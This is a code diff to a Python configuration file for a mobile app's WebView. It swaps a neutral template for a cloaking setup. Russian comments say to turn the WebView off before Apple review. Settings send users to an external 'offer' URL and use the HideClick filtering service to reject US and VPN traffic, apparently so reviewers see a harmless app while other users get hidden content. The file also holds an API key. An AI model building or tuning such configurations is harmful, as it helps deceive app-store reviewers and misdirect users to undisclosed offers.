@@ -1,16 +1,51 @@
-"""
-config.py
+# Главный тумблер
+webview_power_state = "on"       # "on" / "off" — перед ревью Apple ставь "off"
 
-Минимальная конфигурация для управления WebView.
-Меняешь только эти значения — логика приложения не трогается.
-"""
+# Оффер
+offer_url = "https://gexuilan.com/nWzZwGwP"
 
-# Главный переключатель WebView
-# Возможные значения:
-# - "on"  -> WebView включен
-# - "off" -> WebView выключен
-webview_power_state = "on"
+# HideClick API
+hideclick_api_key = "v1cdfa4fa1fb8b4fa0a1542ad14b5164d9"
+hideclick_stage = "app"          # "app" для мобильных приложений
+hideclick_version = 20250620
+hideclick_group = "com.dddvvv.cybertower"
 
-# URL, который должен открываться в WebView,
-# если WebView включен
-upstream_webview_url = "https://your-domain.com/"
+# Гео фильтр
+filter_geo_mode = "reject"       # "allow" / "reject" / "" (выкл)
+filter_geo_list = "US"           # коды стран через запятую: "US", "US,GB,DE"
+
+# Сеть фильтр
+filter_net_mode = "reject"       # "allow" / "reject" / "" (выкл)
+filter_net_list = "vpn"          # vpn, mobile, residential, corporate — через запятую
+
+# UTM фильтр
+filter_utm_mode = ""             # "allow" / "reject" / "" (выкл)
+filter_utm_list = ""             # regexp
+
+# Реферер фильтр
+filter_ref_mode = ""             # "allow" / "reject" / "" (выкл)
+filter_ref_list = ""             # regexp
+filter_noref = ""                # "allow" / "reject" / "" (выкл) — запросы без реферера
+
+# Браузер фильтр
+filter_bro_mode = ""             # "allow" / "reject" / "" (выкл)
+filter_bro_list = ""             # названия браузеров
+
+# DDOS защита
+block_ddos = False               # True — блокировать IP при DDOS
+delay_start = 0                  # блокировать первые N уникальных IP
+delay_permanent = False          # навсегда блокировать IP из delay_start
+delay_nonbot = False             # не считать ботов в delay_start
+
+# Сессии
+use_sessions = True              # не перепроверять юзера после первой проверки
+
+# Кэш
+disable_cache = False
+skip_cache = False
+
+# ML (PRO)
+ml_set = ""                      # кастомные AI модели HideClick PRO
+
+# Debug
+debug_mode = "on"               # "on" / "off"
